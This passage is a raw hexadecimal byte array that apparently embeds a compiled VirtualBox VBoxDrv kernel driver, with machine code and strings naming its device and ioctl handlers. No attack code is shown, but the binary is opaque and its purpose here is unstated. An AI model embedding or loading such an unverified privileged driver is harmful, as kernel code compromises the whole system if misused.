    0x05, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x74, 0x24, 0x78, 0x45, 0x33, 0xC9, 0x49, 0x83, 0xF8, 0xFF,
    0x4D, 0x0F, 0x45, 0xC8, 0x48, 0x83, 0xFE, 0xFF, 0x0F, 0x95, 0xC2, 0xC7, 0x44, 0x24, 0x28, 0x10,
    0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0x41, 0xB8, 0x01, 0x00, 0x00,
    0x00, 0x48, 0x8B, 0x4F, 0x58, 0xFF, 0x15, 0x15, 0x06, 0x00, 0x00, 0x4C, 0x8B, 0xE8, 0x48, 0x85,
    0xC0, 0x74, 0x3E, 0x4C, 0x8B, 0x4F, 0x10, 0x4C, 0x8B, 0xC0, 0xBA, 0x08, 0x00, 0x00, 0x00, 0x8D,
    0x4A, 0x58, 0xE8, 0x49, 0xE3, 0xFF, 0xFF, 0x48, 0x85, 0xC0, 0x74, 0x0F, 0x48, 0x89, 0x70, 0x30,
    0x49, 0x89, 0x04, 0x24, 0x33, 0xC0, 0xE9, 0x9E, 0x00, 0x00, 0x00, 0xBB, 0xF8, 0xFF, 0xFF, 0xFF,
    0x89, 0x5C, 0x24, 0x30, 0x48, 0x8B, 0x57, 0x58, 0x49, 0x8B, 0xCD, 0xFF, 0x15, 0xD7, 0x05, 0x00,
    0x00, 0xEB, 0x09, 0xBB, 0xB5, 0xFF, 0xFF, 0xFF, 0x89, 0x5C, 0x24, 0x30, 0xEB, 0x72, 0x83, 0x7A,
    0x08, 0x05, 0x75, 0x70, 0x80, 0x7A, 0x38, 0x00, 0x75, 0x6A, 0x48, 0x83, 0x7C, 0x24, 0x78, 0xFF,
    0x74, 0x07, 0xB8, 0xDB, 0xFF, 0xFF, 0xFF, 0xEB, 0x60, 0x41, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48,
    0x8B, 0x52, 0x10, 0x48, 0x8B, 0x4F, 0x30, 0xFF, 0x15, 0xDB, 0x06, 0x00, 0x00, 0x48, 0x8B, 0xF0,
    0x48, 0x85, 0xC0, 0x74, 0x3B, 0x4C, 0x8B, 0x4F, 0x10, 0x4C, 0x8B, 0xC0, 0xBA, 0x08, 0x00, 0x00,
    0x00, 0x8D, 0x4A, 0x58, 0xE8, 0xC7, 0xE2, 0xFF, 0xFF, 0x48, 0x85, 0xC0, 0x74, 0x10, 0x48, 0xC7,
    0x40, 0x30, 0xFF, 0xFF, 0xFF, 0xFF, 0x49, 0x89, 0x04, 0x24, 0x33, 0xC0, 0xEB, 0x1B, 0xBB, 0xF8,
    0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x57, 0x10, 0x48, 0x8B, 0xCE, 0xFF, 0x15, 0x58, 0x06, 0x00, 0x00,
    0x8B, 0xC3, 0xEB, 0x05, 0xB8, 0xE0, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48, 0x8B,
    0x74, 0x24, 0x58, 0x48, 0x8B, 0x7C, 0x24, 0x60, 0x4C, 0x8B, 0x64, 0x24, 0x68, 0x48, 0x83, 0xC4,
    0x40, 0x41, 0x5D, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x38, 0x8B, 0x44, 0x24, 0x60, 0x48, 0xC7, 0x44, 0x24, 0x28, 0xFF, 0xFF, 0xFF,
    0xFF, 0x89, 0x44, 0x24, 0x20, 0xE8, 0x56, 0xFE, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x6C, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57,
    0x48, 0x83, 0xEC, 0x30, 0x49, 0x8B, 0xD9, 0x49, 0x8B, 0xF8, 0x48, 0x8B, 0xF2, 0x48, 0x8B, 0xE9,
    0xE8, 0xFB, 0xD0, 0xFF, 0xFF, 0x4C, 0x8B, 0x54, 0x24, 0x68, 0x4C, 0x3B, 0xD0, 0x74, 0x07, 0xB8,
    0xDB, 0xFF, 0xFF, 0xFF, 0xEB, 0x1E, 0x8B, 0x44, 0x24, 0x60, 0x4C, 0x89, 0x54, 0x24, 0x28, 0x4C,
    0x8B, 0xCB, 0x4C, 0x8B, 0xC7, 0x48, 0x8B, 0xD6, 0x48, 0x8B, 0xCD, 0x89, 0x44, 0x24, 0x20, 0xE8,
    0xFC, 0xFD, 0xFF, 0xFF, 0x48, 0x8B, 0x5C, 0x24, 0x40, 0x48, 0x8B, 0x6C, 0x24, 0x48, 0x48, 0x8B,
    0x74, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x30, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4C, 0x8B, 0xCA, 0x83, 0x79, 0x50, 0x00, 0x75, 0x33, 0x44, 0x8B, 0x41, 0x08, 0x41, 0x83, 0xE8,
    0x05, 0x74, 0x1D, 0x41, 0x83, 0xE8, 0x02, 0x74, 0x0C, 0x41, 0x83, 0xF8, 0x01, 0x75, 0x06, 0x48,
    0x8B, 0x49, 0x20, 0xEB, 0xDE, 0x48, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0xC3,
    0x49, 0xC1, 0xE1, 0x0C, 0x4C, 0x03, 0x49, 0x30, 0x49, 0x8B, 0xC1, 0xC3, 0x83, 0x79, 0x50, 0x01,
    0x75, 0x0E, 0x48, 0x8B, 0x41, 0x58, 0x48, 0x8B, 0x44, 0xD0, 0x30, 0x48, 0xC1, 0xE0, 0x0C, 0xC3,
    0x48, 0xB8, 0xAB, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x49, 0xF7, 0xE1, 0x48, 0xC1, 0xEA,
    0x0C, 0x48, 0x8D, 0x04, 0x52, 0x48, 0xC1, 0xE0, 0x0B, 0x4C, 0x2B, 0xC8, 0x48, 0x8B, 0x44, 0xD1,
    0x58, 0x4A, 0x8B, 0x44, 0xC8, 0x30, 0x48, 0xC1, 0xE0, 0x0C, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x44, 0x88, 0x44, 0x24, 0x18, 0x48, 0x89, 0x54, 0x24, 0x10, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x53,
    0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xEC, 0x40, 0x45, 0x0F,
    0xB6, 0xE8, 0x48, 0x8B, 0xFA, 0x4C, 0x8B, 0xE1, 0x48, 0x81, 0xFA, 0x00, 0x00, 0x00, 0x40, 0x76,
    0x0A, 0xB8, 0xCA, 0xFF, 0xFF, 0xFF, 0xE9, 0xC8, 0x01, 0x00, 0x00, 0x45, 0x0F, 0xB6, 0xC5, 0xE8,
    0x5C, 0xF4, 0xFF, 0xFF, 0x44, 0x8B, 0xF0, 0x85, 0xC0, 0x0F, 0x88, 0xD7, 0x00, 0x00, 0x00, 0x4C,
    0x8B, 0xD7, 0x49, 0xC1, 0xEA, 0x0C, 0x0F, 0x84, 0xC2, 0x00, 0x00, 0x00, 0x4D, 0x8B, 0x1C, 0x24,
    0x41, 0x8B, 0x73, 0x50, 0x49, 0x8B, 0xDA, 0x48, 0xC1, 0xE3, 0x0C, 0x48, 0xB8, 0xAB, 0xAA, 0xAA,
    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x49, 0xBF, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x90,
    0x49, 0x83, 0xEA, 0x01, 0x48, 0x81, 0xEB, 0x00, 0x10, 0x00, 0x00, 0x85, 0xF6, 0x74, 0x39, 0x83,
    0xFE, 0x01, 0x75, 0x0F, 0x49, 0x8B, 0x43, 0x58, 0x4A, 0x8B, 0x44, 0xD0, 0x30, 0x48, 0xC1, 0xE0,
    0x0C, 0xEB, 0x4D, 0x49, 0xF7, 0xE2, 0x48, 0xC1, 0xEA, 0x0C, 0x48, 0x8D, 0x04, 0x52, 0x48, 0xC1,
    0xE0, 0x0B, 0x49, 0x8B, 0xCA, 0x48, 0x2B, 0xC8, 0x49, 0x8B, 0x44, 0xD3, 0x58, 0x48, 0x8B, 0x44,
    0xC8, 0x30, 0x48, 0xC1, 0xE0, 0x0C, 0xEB, 0x28, 0x41, 0x8B, 0x4B, 0x08, 0x83, 0xE9, 0x05, 0x74,
    0x18, 0x83, 0xE9, 0x02, 0x74, 0x1F, 0x83, 0xF9, 0x01, 0x75, 0x1A, 0x49, 0x8B, 0xD2, 0x49, 0x8B,
    0x4B, 0x20, 0xE8, 0x99, 0xFE, 0xFF, 0xFF, 0xEB, 0x07, 0x49, 0x8B, 0x43, 0x30, 0x48, 0x03, 0xC3,
    0x49, 0x3B, 0xC7, 0x73, 0x15, 0x4D, 0x85, 0xD2, 0x48, 0xB8, 0xAB, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
    0xAA, 0xAA, 0x0F, 0x85, 0x78, 0xFF, 0xFF, 0xFF, 0xEB, 0x14, 0x33, 0xD2, 0x49, 0x8B, 0xCB, 0xE8,
    0x3C, 0xE3, 0xFF, 0xFF, 0x49, 0xC7, 0x04, 0x24, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x08, 0x41, 0x8B,
    0xC6, 0xE9, 0xDD, 0x00, 0x00, 0x00, 0xBA, 0xFF, 0xFF, 0xFF, 0xFF, 0x4C, 0x8B, 0xCF, 0x45, 0x33,
    0xC0, 0x33, 0xC9, 0xFF, 0x15, 0x07, 0x04, 0x00, 0x00, 0x48, 0x8B, 0xD8, 0x48, 0x89, 0x84, 0x24,
    0x98, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0xA7, 0x00, 0x00, 0x00, 0x8B, 0x48, 0x28,
    0x48, 0x3B, 0xCF, 0x0F, 0x82, 0x87, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x28, 0x10, 0x00, 0x00,
    0x00, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0x45, 0x33, 0xC9, 0x33, 0xD2, 0x45, 0x8D,
    0x41, 0x01, 0x48, 0x8B, 0xC8, 0xFF, 0x15, 0x95, 0x02, 0x00, 0x00, 0x48, 0x8B, 0xF0, 0x48, 0x85,
    0xC0, 0x74, 0x3B, 0x4C, 0x8B, 0xCF, 0x4C, 0x8B, 0xC0, 0xBA, 0x02, 0x00, 0x00, 0x00, 0x8D, 0x4A,
    0x5E, 0xE8, 0xCA, 0xDF, 0xFF, 0xFF, 0x48, 0x85, 0xC0, 0x74, 0x17, 0xC6, 0x40, 0x40, 0x01, 0xC7,
    0x40, 0x50, 0x01, 0x00, 0x00, 0x00, 0x48, 0x89, 0x58, 0x58, 0x49, 0x89, 0x04, 0x24, 0x33, 0xC0,
    0xEB, 0x51, 0x48, 0x8B, 0xD3, 0x48, 0x8B, 0xCE, 0xFF, 0x15, 0x5A, 0x02, 0x00, 0x00, 0xEB, 0x20,
    0x44, 0x8A, 0xAC, 0x24, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xBC, 0x24, 0x88, 0x00, 0x00, 0x00,
    0x4C, 0x8B, 0xA4, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x9C, 0x24, 0x98, 0x00, 0x00, 0x00,
    0x48, 0x8B, 0xCB, 0xFF, 0x15, 0x3F, 0x03, 0x00, 0x00, 0x33, 0xD2, 0x48, 0x8B, 0xCB, 0xFF, 0x15,
    0xC4, 0x02, 0x00, 0x00, 0x45, 0x0F, 0xB6, 0xC5, 0x48, 0x8B, 0xD7, 0x49, 0x8B, 0xCC, 0xE8, 0x8D,
    0xF4, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x5F,
    0x5E, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xB0, 0x01, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x08, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x8B, 0xFA, 0x48, 0x8D, 0x51, 0x10,
    0x48, 0x8B, 0xD9, 0x33, 0xC9, 0x41, 0xB8, 0x49, 0x50, 0x52, 0x54, 0xFF, 0x15, 0x6F, 0x02, 0x00,
    0x00, 0x48, 0x85, 0xC0, 0x74, 0x0F, 0xC7, 0x00, 0x19, 0x01, 0x09, 0x18, 0x89, 0x78, 0x04, 0x89,
    0x58, 0x08, 0x89, 0x58, 0x0C, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3,
    0x83, 0x01, 0x01, 0x33, 0xD2, 0x48, 0xFF, 0x25, 0x3C, 0x02, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x08, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0xF9, 0x48, 0x8D, 0x8A,
    0xFF, 0x0F, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x3C, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x38,
    0xFF, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x54, 0x24, 0x38, 0x48, 0x81, 0xE1, 0x00, 0xF0, 0xFF, 0xFF,
    0xFF, 0x15, 0xCA, 0x01, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x48, 0x8B, 0xD8, 0x74, 0x36, 0x48, 0xA9,
    0xFF, 0x0F, 0x00, 0x00, 0x75, 0x25, 0x48, 0x8B, 0xC8, 0xFF, 0x15, 0x91, 0x01, 0x00, 0x00, 0x48,
    0x8B, 0xC8, 0x48, 0xC1, 0xE9, 0x20, 0x75, 0x13, 0x8B, 0xC8, 0x48, 0x8B, 0xC3, 0x48, 0x89, 0x0F,
    0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0x48, 0x8B, 0xCB, 0xFF, 0x15,
    0xE4, 0x00, 0x00, 0x00, 0x33, 0xC0, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x83, 0xC4, 0x20, 0x5F,
    0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0x48, 0x85, 0xC9, 0x74, 0x06, 0xFF, 0x15, 0xB9, 0x00, 0x00, 0x00, 0x48,
    0x83, 0xC4, 0x28, 0xC3, 0xFF, 0x25, 0x7E, 0x01, 0x00, 0x00, 0xFF, 0x25, 0x80, 0x01, 0x00, 0x00,
    0xFF, 0x25, 0x82, 0x01, 0x00, 0x00, 0xFF, 0x25, 0x84, 0x01, 0x00, 0x00, 0xFF, 0x25, 0x86, 0x01,
    0x00, 0x00, 0xFF, 0x25, 0x88, 0x01, 0x00, 0x00, 0xFF, 0x25, 0x8A, 0x01, 0x00, 0x00, 0xFF, 0x25,
    0x8C, 0x01, 0x00, 0x00, 0xFF, 0x25, 0x8E, 0x01, 0x00, 0x00, 0xFF, 0x25, 0x90, 0x01, 0x00, 0x00,
    0xFF, 0x25, 0x92, 0x01, 0x00, 0x00, 0xFF, 0x25, 0x94, 0x01, 0x00, 0x00, 0xFF, 0x25, 0x96, 0x01,
    0x00, 0x00, 0xFF, 0x25, 0x98, 0x01, 0x00, 0x00, 0xFF, 0x25, 0x9A, 0x01, 0x00, 0x00, 0xFF, 0x25,
    0x9C, 0x01, 0x00, 0x00, 0xFF, 0x25, 0x9E, 0x01, 0x00, 0x00, 0xFF, 0x25, 0xA0, 0x01, 0x00, 0x00,
    0xFF, 0x25, 0xA2, 0x01, 0x00, 0x00, 0xFF, 0x25, 0xA4, 0x01, 0x00, 0x00, 0xFF, 0x25, 0xA6, 0x01,
    0x00, 0x00, 0xFF, 0x25, 0xA8, 0x01, 0x00, 0x00, 0xFF, 0x25, 0xAA, 0x01, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x50, 0xE9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0xE9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x72, 0xE9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x86, 0xE9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xA0, 0xE9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAC, 0xE9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xC8, 0xE9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE0, 0xE9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xF0, 0xE9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0xEA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x1C, 0xEA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3C, 0xEA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x52, 0xEA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x62, 0xEA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x7A, 0xEA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8C, 0xEA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xA4, 0xEA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBE, 0xEA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xD4, 0xEA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE6, 0xEA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xFC, 0xEA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x14, 0xEB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x2E, 0xEB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4A, 0xEB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x5A, 0xEB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x78, 0xEB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x90, 0xEB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA2, 0xEB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xAC, 0xEB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC4, 0xEB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xDC, 0xEB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF2, 0xEB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x06, 0xEC, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1E, 0xEC, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x38, 0xEC, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4C, 0xEC, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x6A, 0xEC, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7E, 0xEC, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x92, 0xEC, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA0, 0xEC, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xB0, 0xEC, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC8, 0xEC, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xDE, 0xEC, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF4, 0xEC, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x06, 0xED, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0xED, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x2C, 0xED, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46, 0xED, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x62, 0xED, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7A, 0xED, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x92, 0xED, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA8, 0xED, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x8D, 0xB5, 0x40, 0x48, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
    0x72, 0x00, 0x00, 0x00, 0x60, 0x9F, 0x00, 0x00, 0x60, 0x9F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x56, 0x42, 0x6F, 0x78, 0x44, 0x72, 0x76, 0x4C, 0x69, 0x6E, 0x75, 0x78, 0x49, 0x4F, 0x43, 0x74,
    0x6C, 0x3A, 0x20, 0x74, 0x6F, 0x6F, 0x20, 0x6D, 0x75, 0x63, 0x68, 0x20, 0x6F, 0x75, 0x74, 0x70,
    0x75, 0x74, 0x21, 0x20, 0x25, 0x23, 0x78, 0x20, 0x3E, 0x20, 0x25, 0x23, 0x78, 0x3B, 0x20, 0x75,
    0x43, 0x6D, 0x64, 0x3D, 0x25, 0x23, 0x78, 0x21, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x4B, 0x00, 0x65, 0x00, 0x46, 0x00, 0x6C, 0x00, 0x75, 0x00, 0x73, 0x00, 0x68, 0x00, 0x51, 0x00,
    0x75, 0x00, 0x65, 0x00, 0x75, 0x00, 0x65, 0x00, 0x64, 0x00, 0x44, 0x00, 0x70, 0x00, 0x63, 0x00,
    0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0A, 0x21, 0x21, 0x41, 0x73, 0x73, 0x65, 0x72,
    0x74, 0x69, 0x6F, 0x6E, 0x20, 0x46, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x21, 0x21, 0x0A, 0x45, 0x78,
    0x70, 0x72, 0x65, 0x73, 0x73, 0x69, 0x6F, 0x6E, 0x3A, 0x20, 0x25, 0x73, 0x0A, 0x4C, 0x6F, 0x63,
    0x61, 0x74, 0x69, 0x6F, 0x6E, 0x20, 0x20, 0x3A, 0x20, 0x25, 0x73, 0x28, 0x25, 0x64, 0x29, 0x20,
    0x25, 0x73, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x5C, 0x00, 0x44, 0x00, 0x6F, 0x00, 0x73, 0x00,
    0x44, 0x00, 0x65, 0x00, 0x76, 0x00, 0x69, 0x00, 0x63, 0x00, 0x65, 0x00, 0x73, 0x00, 0x5C, 0x00,
    0x56, 0x00, 0x42, 0x00, 0x6F, 0x00, 0x78, 0x00, 0x44, 0x00, 0x72, 0x00, 0x76, 0x00, 0x00, 0x00,
    0x5C, 0x00, 0x44, 0x00, 0x65, 0x00, 0x76, 0x00, 0x69, 0x00, 0x63, 0x00, 0x65, 0x00, 0x5C, 0x00,
    0x56, 0x00, 0x42, 0x00, 0x6F, 0x00, 0x78, 0x00, 0x44, 0x00, 0x72, 0x00, 0x76, 0x00, 0x00, 0x00,
    0x73, 0x75, 0x70, 0x64, 0x72, 0x76, 0x4C, 0x64, 0x72, 0x46, 0x72, 0x65, 0x65, 0x3A, 0x20, 0x49,
    0x6D, 0x61, 0x67, 0x65, 0x20, 0x27, 0x25, 0x73, 0x27, 0x20, 0x68, 0x61, 0x73, 0x20, 0x25, 0x64,
    0x20, 0x64, 0x61, 0x6E, 0x67, 0x6C, 0x69, 0x6E, 0x67, 0x20, 0x6F, 0x62, 0x6A, 0x65, 0x63, 0x74,
    0x73, 0x21, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x76, 0x62, 0x6F, 0x78, 0x64, 0x72, 0x76, 0x3A, 0x20, 0x42, 0x61, 0x64, 0x20, 0x69, 0x6F, 0x63,
    0x74, 0x6C, 0x20, 0x72, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x20, 0x68, 0x65, 0x61, 0x64, 0x65,
    0x72, 0x3B, 0x20, 0x63, 0x62, 0x49, 0x6E, 0x3D, 0x25, 0x23, 0x6C, 0x78, 0x20, 0x63, 0x62, 0x4F,
    0x75, 0x74, 0x3D, 0x25, 0x23, 0x6C, 0x78, 0x20, 0x66, 0x46, 0x6C, 0x61, 0x67, 0x73, 0x3D, 0x25,
    0x23, 0x6C, 0x78, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x76, 0x62, 0x6F, 0x78, 0x64, 0x72, 0x76, 0x3A,
    0x20, 0x62, 0x61, 0x64, 0x20, 0x63, 0x6F, 0x6F, 0x6B, 0x69, 0x65, 0x20, 0x25, 0x23, 0x6C, 0x78,
    0x20, 0x2F, 0x20, 0x25, 0x23, 0x6C, 0x78, 0x2E, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x28, 0x20, 0x28, 0x28, 0x30, 0x78, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x32, 0x32, 0x29, 0x20,
    0x3C, 0x3C, 0x20, 0x31, 0x36, 0x29, 0x20, 0x7C, 0x20, 0x28, 0x28, 0x28, 0x20, 0x30, 0x78, 0x30,
    0x30, 0x30, 0x32, 0x20, 0x29, 0x29, 0x20, 0x3C, 0x3C, 0x20, 0x31, 0x34, 0x29, 0x20, 0x7C, 0x20,
    0x28, 0x28, 0x28, 0x31, 0x33, 0x29, 0x20, 0x7C, 0x20, 0x31, 0x32, 0x38, 0x29, 0x20, 0x3C, 0x3C,
    0x20, 0x32, 0x29, 0x20, 0x7C, 0x20, 0x28, 0x30, 0x29, 0x20, 0x29, 0x3A, 0x20, 0x49, 0x6E, 0x76,
    0x61, 0x6C, 0x69, 0x64, 0x20, 0x69, 0x6E, 0x70, 0x75, 0x74, 0x2F, 0x6F, 0x75, 0x74, 0x70, 0x75,
    0x74, 0x20, 0x73, 0x69, 0x7A, 0x65, 0x73, 0x2E, 0x20, 0x63, 0x62, 0x49, 0x6E, 0x3D, 0x25, 0x6C,
    0x64, 0x20, 0x65, 0x78, 0x70, 0x65, 0x63, 0x74, 0x65, 0x64, 0x20, 0x25, 0x6C, 0x64, 0x2E, 0x20,
    0x63, 0x62, 0x4F, 0x75, 0x74, 0x3D, 0x25, 0x6C, 0x64, 0x20, 0x65, 0x78, 0x70, 0x65, 0x63, 0x74,
    0x65, 0x64, 0x20, 0x25, 0x6C, 0x64, 0x2E, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x53, 0x55, 0x50, 0x5F, 0x49, 0x4F, 0x43, 0x54, 0x4C, 0x5F, 0x50, 0x41, 0x47, 0x45, 0x5F, 0x41,
    0x4C, 0x4C, 0x4F, 0x43, 0x3A, 0x20, 0x49, 0x6E, 0x76, 0x61, 0x6C, 0x69, 0x64, 0x20, 0x69, 0x6E,
    0x70, 0x75, 0x74, 0x2F, 0x6F, 0x75, 0x74, 0x70, 0x75, 0x74, 0x20, 0x73, 0x69, 0x7A, 0x65, 0x73,
    0x2E, 0x20, 0x63, 0x62, 0x49, 0x6E, 0x3D, 0x25, 0x6C, 0x64, 0x20, 0x65, 0x78, 0x70, 0x65, 0x63,
    0x74, 0x65, 0x64, 0x20, 0x25, 0x6C, 0x64, 0x2E, 0x20, 0x63, 0x62, 0x4F, 0x75, 0x74, 0x3D, 0x25,
    0x6C, 0x64, 0x20, 0x65, 0x78, 0x70, 0x65, 0x63, 0x74, 0x65, 0x64, 0x20, 0x25, 0x6C, 0x64, 0x2E,
    0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x53, 0x55, 0x50, 0x5F, 0x49, 0x4F, 0x43, 0x54,
    0x4C, 0x5F, 0x50, 0x41, 0x47, 0x45, 0x5F, 0x41, 0x4C, 0x4C, 0x4F, 0x43, 0x3A, 0x20, 0x25, 0x73,
    0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x52, 0x65, 0x71, 0x2D, 0x3E, 0x48, 0x64,
    0x72, 0x2E, 0x63, 0x62, 0x49, 0x6E, 0x20, 0x3C, 0x3D, 0x20, 0x53, 0x55, 0x50, 0x5F, 0x49, 0x4F,
    0x43, 0x54, 0x4C, 0x5F, 0x50, 0x41, 0x47, 0x45, 0x5F, 0x41, 0x4C, 0x4C, 0x4F, 0x43, 0x5F, 0x53,
    0x49, 0x5A, 0x45, 0x5F, 0x49, 0x4E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
